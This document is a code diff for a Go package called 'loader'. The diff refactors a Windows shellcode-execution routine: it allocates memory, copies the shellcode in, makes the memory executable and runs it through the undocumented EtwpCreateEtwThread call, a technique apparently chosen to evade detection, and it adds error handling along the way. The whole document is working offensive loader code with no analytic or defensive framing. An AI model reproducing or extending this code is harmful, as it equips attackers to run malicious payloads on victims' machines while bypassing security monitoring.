@@ -1,24 +1,57 @@
 package loader
 
 import (
+	"fmt"
 	"unsafe"
-	"variant/wdll"
+	"variant/xwindows"
 
 	"golang.org/x/sys/windows"
 )
 
-func EtwpCreateEtwThread(shellcode []byte) {
-	addr, _, err := wdll.VirtualAlloc().Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+func EtwpCreateEtwThreadX(shellcode []byte) error {
+	addr, vaErr := xwindows.VirtualAlloc(
+		0,
+		uintptr(len(shellcode)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_EXECUTE_READWRITE,
+	)
 	if addr == 0 {
-		panic(err)
+		return fmt.Errorf("VirtualAlloc failed: %w", vaErr)
 	}
 
-	_, _, _ = wdll.RtlCopyMemory().Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	rmErr := xwindows.RtlMoveMemory(
+		unsafe.Pointer(addr),
+		unsafe.Pointer(&shellcode[0]),
+		uintptr(len(shellcode)),
+	)
+	if rmErr != nil {
+		return fmt.Errorf("RtlMoveMemory failed: %w", rmErr)
+	}
 
-	oldProtect := windows.PAGE_READWRITE
-	_, _, _ = wdll.VirtualProtect().Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	var oldProtect uint32
+	_, vpErr := xwindows.VirtualProtect(
+		addr,
+		uintptr(len(shellcode)),
+		windows.PAGE_EXECUTE_READ,
+		&oldProtect,
+	)
+	if vpErr != nil {
+		return fmt.Errorf("VirtualProtect failed: %v", vpErr)
+	}
 
-	thread, _, _ := wdll.EtwpCreateEtwThread().Call(addr, uintptr(0))
+	thread, etwCtErr := xwindows.EtwpCreateEtwThread(
+		addr, uintptr(0))
+	if etwCtErr != nil {
+		return fmt.Errorf("EtwpCreateEtwThread failed: %v", etwCtErr)
+	}
 
-	_, _, _ = wdll.WaitForSingleObject().Call(thread, 0xFFFFFFFF)
+	_, wsErr := xwindows.WaitForSingleObject(
+		windows.Handle(thread),
+		windows.INFINITE,
+	)
+	if wsErr != nil {
+		return fmt.Errorf("WaitForSingleObject failed: %v", wsErr)
+	}
+
+	return nil
 }
